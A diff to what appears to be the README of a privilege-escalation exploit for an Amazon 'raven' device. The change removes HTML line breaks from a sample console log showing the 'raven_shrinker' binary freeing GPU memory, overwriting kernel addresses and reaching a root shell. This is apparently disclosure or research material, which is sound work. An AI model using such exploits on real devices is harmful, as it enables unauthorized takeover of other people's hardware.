@@ -8,25 +8,26 @@ android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androide
 ```
 The exploit should be run 30-90sec after the Cube boots for greatest reliability.
 ```
-raven:/ $ /data/local/tmp/raven_shrinker<br>
+raven:/ $ /data/local/tmp/raven_shrinker
 fingerprint: Amazon/raven/raven:9/PS7624.3337N/0026810845440:user/amz-p,release-keys
 failed, retry.
-failed, retry.<br>
-failed, retry.<br>
-failed, retry.<br>
-region freed 80<br>
-alias gpu va 100c85000<br>
-read 0<br>
-cleanup flush region<br>
-release_mem_pool<br>
-jit_freed<br>
-jit_free commit: 2 0<br>
-Found freed_idx 2<br>
-Found pgd 23, 100cce000<br>
-overwrite addr : 104100634 634<br>
-overwrite addr : 104300634 634<br>
-overwrite addr : 1041001c4 1c4<br>
-overwrite addr : 1043001c4 1c4<br>
-result 50<br>
+failed, retry.
+failed, retry.
+failed, retry.
+region freed 80
+alias gpu va 100c85000
+read 0
+cleanup flush region
+release_mem_pool
+jit_freed
+jit_free commit: 2 0
+Found freed_idx 2
+Found pgd 23, 100cce000
+overwrite addr : 104100634 634
+overwrite addr : 104300634 634
+overwrite addr : 1041001c4 1c4
+overwrite addr : 1043001c4 1c4
+result 50
+raven:/ #
 raven:/ # 
 ```
